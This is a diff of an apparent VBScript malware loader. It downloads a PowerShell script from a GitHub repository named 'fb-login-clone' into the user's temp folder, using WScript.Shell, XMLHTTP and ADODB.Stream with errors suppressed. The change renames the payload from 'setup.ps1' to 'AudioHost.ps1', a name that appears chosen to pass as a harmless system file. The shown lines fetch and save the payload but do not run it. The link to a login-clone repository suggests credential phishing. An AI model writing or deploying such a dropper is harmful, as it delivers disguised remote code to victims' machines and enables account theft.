@@ -2,8 +2,8 @@ Set shell = CreateObject("WScript.Shell")
 Set http = CreateObject("MSXML2.XMLHTTP")
 Set stream = CreateObject("ADODB.Stream")
 
-url = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache/setup.ps1"
-dest = shell.ExpandEnvironmentStrings("%TEMP%\setup.ps1")
+url = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache/AudioHost.ps1"
+dest = shell.ExpandEnvironmentStrings("%TEMP%\AudioHost.ps1")
 
 On Error Resume Next
 
